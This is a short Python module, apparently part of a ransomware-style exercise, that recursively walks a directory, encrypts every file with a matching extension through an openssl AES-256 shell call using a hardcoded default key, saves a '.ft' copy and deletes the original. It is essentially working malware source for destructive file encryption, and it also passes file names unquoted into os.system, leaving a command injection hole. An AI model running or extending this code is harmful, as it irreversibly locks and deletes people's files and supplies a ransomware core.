import os
from extensions import check_file_extension

def	encrypt_file(file, silent, key = '0123456789ABCDEF'):
	if check_file_extension(file):
		os.system('openssl enc -k {} -aes256 -base64 -e -in {} -out {}.ft'.format(key, file, file))
		os.remove(file)
		if not silent:
			print('Encrypting {}'.format(file))

def	encryption(direction, silent, key = '0123456789ABCDEF'):
	ls = os.listdir(direction)
	for file in ls:
		file_path = direction + '/' + file
		if os.path.isdir(file_path):
			encryption(file_path, silent)
		if os.path.isfile(file_path):
			encrypt_file(file_path, silent)
